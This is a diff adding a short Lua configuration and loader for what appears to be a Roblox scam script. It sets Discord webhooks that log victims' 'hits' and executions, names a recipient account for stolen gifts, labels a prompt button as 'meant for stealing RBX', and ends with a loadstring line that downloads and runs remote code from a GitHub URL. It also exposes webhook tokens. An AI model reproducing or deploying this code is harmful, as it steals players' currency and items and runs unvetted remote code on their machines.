@@ -1,0 +1,7 @@
+LogsWebhook = "https://discord.com/api/webhooks/1323992589875150918/Te5uPYpLlbboQtIEVNOXHMfLw0W89OkFNo0jUxUbzxULhfqmh3UkXR8Tpa4GcXiDHSw5" -- << Webhook for logging hits >>
+ExecutionWebhook = "https://discord.com/api/webhooks/1317186408120717384/4mj7i7nBL7dGA7TGE71GF2MV_EGX2rg8R-_QlJbj79vAbPZYdGQ0UmwJwI3JyfmIYa43" -- << Webhook for logging executions >>
+Username = "caygamebloxfruits_33" -- << Username of the account where gifts will be sent >>
+PromptText = "Launch Script." -- << Text of the button meant for stealing RBX >>
+RandomizedPrompt = false -- << Makes the prompt have a unique design each execution >>
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))()
